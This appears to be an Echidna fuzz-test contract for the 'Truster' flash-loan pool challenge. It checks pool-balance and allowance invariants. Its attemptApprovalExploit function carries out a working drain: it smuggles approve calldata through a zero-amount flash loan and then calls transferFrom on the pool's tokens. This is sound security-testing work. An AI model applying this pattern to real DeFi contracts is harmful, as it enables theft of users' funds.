// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {MyToken} from "../../src/Token.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

/**
 * @title TrusterEchidnaChallenge
 * @dev Comprehensive Echidna test for discovering Truster vulnerabilities
 */
contract TrusterEchidnaChallenge {
    MyToken public token;
    TrusterLenderPool public pool;
    
    // Challenge constants
    uint256 public constant INITIAL_POOL_BALANCE = 1_000_000e18;
    uint256 public constant MAX_EXPLOIT_AMOUNT = 100_000e18;
    
    // State tracking
    address public immutable attacker;
    uint256 public exploitAttempts;
    uint256 public successfulExploits;
    
    constructor() {
        // Deploy contracts
        token = new MyToken("ChallengeToken", "CHL");
        pool = new TrusterLenderPool(token);
        
        // Set up attacker
        attacker = address(this);
        
        // Fund the pool
        token.mint(address(this), INITIAL_POOL_BALANCE);
        token.transfer(address(pool), INITIAL_POOL_BALANCE);
        
        // Give attacker some tokens
        token.mint(attacker, 1000e18);
    }

    // ============ INVARIANTS ============
    
    /**
     * @dev Invariant 1: Pool balance should never decrease without proper accounting
     */
    function echidna_pool_balance_invariant() public view returns (bool) {
        uint256 currentBalance = token.balanceOf(address(pool));
        return currentBalance >= INITIAL_POOL_BALANCE - 1e18; // Only allow negligible loss
    }
    
    /**
     * @dev Invariant 2: Pool should never approve unknown addresses
     */
    function echidna_no_unauthorized_approvals() public view returns (bool) {
        uint256 allowance = token.allowance(address(pool), attacker);
        return allowance == 0;
    }
    
    /**
     * @dev Invariant 3: Attacker should not accumulate excessive tokens
     */
    function echidna_attacker_balance_limited() public view returns (bool) {
        uint256 attackerBalance = token.balanceOf(attacker);
        return attackerBalance <= 1000e18; // Attacker should only have initial tokens
    }
    
    /**
     * @dev Invariant 4: Flash loan accounting should be consistent
     */
    function echidna_flash_loan_accounting() public view returns (bool) {
        (, uint256 loans, uint256 repayments) = pool.getPoolState();
        // Basic sanity check
        return loans >= repayments;
    }

    // ============ FUZZING FUNCTIONS ============
    
    /**
     * @dev Function 1: Attempt approval exploit
     */
    function attemptApprovalExploit(uint256 amount) public {
        exploitAttempts++;
        
        // Constrain amount to reasonable values
        if (amount == 0 || amount > token.balanceOf(address(pool))) {
            return;
        }
        
        // Craft malicious calldata to approve attacker
        bytes memory maliciousData = abi.encodeWithSignature(
            "approve(address,uint256)",
            attacker,
            amount
        );
        
        try pool.flashLoan(0, attacker, address(token), maliciousData) {
            // Check if approval was successful
            uint256 allowance = token.allowance(address(pool), attacker);
            if (allowance >= amount && allowance > 0) {
                successfulExploits++;
                // Execute the exploit - transfer the approved tokens
                token.transferFrom(address(pool), attacker, allowance);
            }
        } catch {
            // Exploit failed
        }
    }
    
    /**
     * @dev Function 2: Attempt emergency withdraw exploit
     */
    function attemptEmergencyWithdrawExploit(uint256 amount) public {
        exploitAttempts++;
        
        try pool.emergencyWithdraw(attacker, amount) {
            successfulExploits++;
        } catch {
            // Exploit failed
        }
    }
    
    /**
     * @dev Function 3: Attempt generic external call
     */
    function attemptGenericCall(address target, bytes calldata data) public {
        exploitAttempts++;
        
        try pool.flashLoan(0, attacker, target, data) {
            // Check for any state changes
            if (token.allowance(address(pool), attacker) > 0) {
                successfulExploits++;
            }
        } catch {
            // Call failed
        }
    }
    
    /**
     * @dev Function 4: Attempt flash loan with various parameters
     */
    function attemptFlashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) public {
        exploitAttempts++;
        
        // Constrain inputs
        if (amount > token.balanceOf(address(pool))) {
            return;
        }
        
        try pool.flashLoan(amount, borrower, target, data) {
            // Check for successful exploit
            if (token.balanceOf(attacker) > 1000e18) {
                successfulExploits++;
            }
        } catch {
            // Flash loan failed
        }
    }
    
    /**
     * @dev Function 5: Attempt token manipulation
     */
    function attemptTokenManipulation(bytes calldata data) public {
        exploitAttempts++;
        
        try pool.flashLoan(0, attacker, address(token), data) {
            // Check for any token state changes
            if (token.allowance(address(pool), attacker) > 0) {
                successfulExploits++;
            }
        } catch {
            // Manipulation failed
        }
    }

    // ============ HELPER FUNCTIONS ============
    
    /**
     * @dev Get detailed state for analysis
     */
    function getDetailedState() public view returns (
        uint256 poolBalance,
        uint256 attackerBalance,
        uint256 allowance,
        uint256 attempts,
        uint256 successes,
        uint256 poolLoans,
        uint256 poolRepayments
    ) {
        (uint256 balance, uint256 loans, uint256 repayments) = pool.getPoolState();
        
        return (
            balance,
            token.balanceOf(attacker),
            token.allowance(address(pool), attacker),
            exploitAttempts,
            successfulExploits,
            loans,
            repayments
        );
    }
    
    /**
     * @dev Reset function for fresh testing cycles
     */
    function reset() public {
        exploitAttempts = 0;
        successfulExploits = 0;
    }
}
